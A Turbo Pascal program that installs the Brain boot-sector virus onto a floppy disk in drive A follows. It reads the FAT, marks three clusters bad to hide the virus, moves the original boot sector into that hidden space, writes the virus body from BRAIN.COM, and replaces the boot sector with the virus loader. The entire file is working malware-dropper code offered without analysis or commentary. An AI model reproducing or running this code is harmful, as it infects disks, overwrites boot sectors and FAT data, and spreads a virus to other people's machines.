

program put_brain_to_a;

uses dos;

var
  diskbuf          :array[0..32767] of byte;
  cyl,hd,sec       :byte;
  sc,sh,ss         :byte;
  start_cluster    :word;
  brain            :file;

procedure increment(var c,h,s:byte);
begin
  s:=s+1;
  if s>9 then
    begin
      s:=1;
      h:=h+1;
      if h>1 then
        begin
          h:=0;
          c:=c+1;
        end;
    end;
end;

procedure read_sectors(c,h,s,n:byte);
var
  o                :word;
  r                :registers;
begin
  o:=0;
  repeat
    repeat
      r.ah:=2;
      r.al:=1;
      r.bx:=ofs(diskbuf[o]);
      r.es:=seg(diskbuf);
      r.dh:=h;
      r.dl:=0;
      r.ch:=c;
      r.cl:=s;
      intr($13,r);
    until r.flags and 1 = 0;
    n:=n-1;
    o:=o+512;
    increment(c,h,s);
  until n=0;
end;

procedure write_sectors(c,h,s,n:byte);
var
  o                :word;
  r                :registers;
begin
  o:=0;
  repeat
    repeat
      r.ah:=3;
      r.al:=1;
      r.bx:=ofs(diskbuf[o]);
      r.es:=seg(diskbuf);
      r.dh:=h;
      r.dl:=0;
      r.ch:=c;
      r.cl:=s;
      intr($13,r);
    until r.flags and 1 = 0;
    n:=n-1;
    o:=o+512;
    increment(c,h,s);
  until n=0;
end;

procedure init_disk;
var
  r                :registers;
begin
  r.ah:=0;
  r.dl:=0;
  intr($13,r);
end;

function cluster_entry(cl:word):word;
var
  a                :word;
begin
  if odd(cl) then
    begin
      cl:=(cl*3) div 2;
      cl:=diskbuf[cl]+256*diskbuf[cl+1];
      cl:=(cl and $FFF0) shr 4;
    end
  else
    begin
      cl:=(cl*3) div 2;
      cl:=diskbuf[cl]+256*diskbuf[cl+1];
      cl:=cl and $0FFF;
    end;
  cluster_entry:=cl;
end;

procedure mark_cluster(cl,val:word);
begin
  if odd(cl) then
    begin
      cl:=(cl*3) div 2;
      diskbuf[cl]:=(diskbuf[cl] and $0F)+$70;
      diskbuf[cl+1]:=$FF;
      diskbuf[cl+$400]:=diskbuf[cl];
      diskbuf[cl+$401]:=diskbuf[cl+1];
    end
  else
    begin
      cl:=(cl*3) div 2;
      diskbuf[cl]:=$F7;
      diskbuf[cl+1]:=(diskbuf[cl+1] and $F0)+$0F;
      diskbuf[cl+$400]:=diskbuf[cl];
      diskbuf[cl+$401]:=diskbuf[cl+1];
    end;
end;

function find_fat_space:word;
var
  clust_count      :word;
  sc               :word;
begin
  sc:=$37;
  clust_count:=0;
  repeat
    if cluster_entry(sc)=0 then
      begin
        sc:=sc+1;
        clust_count:=clust_count+1;
      end
    else
      begin
        sc:=sc+1;
        clust_count:=0;
      end;
  until clust_count=3;
  sc:=sc-3;
  find_fat_space:=sc;
end;

procedure mark_fat_bad(clust:word);
var
  j                :word;
begin
  for j:=0 to 2 do mark_cluster(start_cluster+j,$FF7);
end;

procedure setup_virus_location;   {set up cyl,hd,sec from start_cluster}
begin
  start_cluster:=((start_cluster-3)*2)+12;     {Get absolute sector number}
  cyl:=start_cluster div 18;                   {Compute cylinder}
  sec:=(start_cluster-18*cyl)+1;
  hd:=0;
  if sec>9 then
    begin
      hd:=1;
      sec:=sec-9;
    end;
  writeln(cyl,' ',hd,' ',sec);
end;

begin
  init_disk;
  read_sectors(0,0,2,4);              {Read FAT tables in}
  start_cluster:=find_fat_space;
  mark_fat_bad(start_cluster);
  write_sectors(0,0,2,4);             {Write FAT tables back out}
  setup_virus_location;               {Calculate cyl,hd,sec}
  sc:=cyl; sh:=hd; ss:=sec;
  read_sectors(0,0,1,1);              {Read the real boot sector}
  write_sectors(cyl,hd,sec,1);        {And put it here}
  increment(cyl,hd,sec);              {Go to next sector}
  assign(brain,'BRAIN.COM');
  reset(brain,32000);
  blockread(brain,diskbuf,1);
  close(brain);
  move(diskbuf[$100],diskbuf[0],2048);
  write_sectors(cyl,hd,sec,3);
  move(diskbuf[$7B00],diskbuf[0],512);
  diskbuf[6]:=sh; diskbuf[7]:=ss; diskbuf[8]:=sc;
  write_sectors(0,0,1,1);
end.


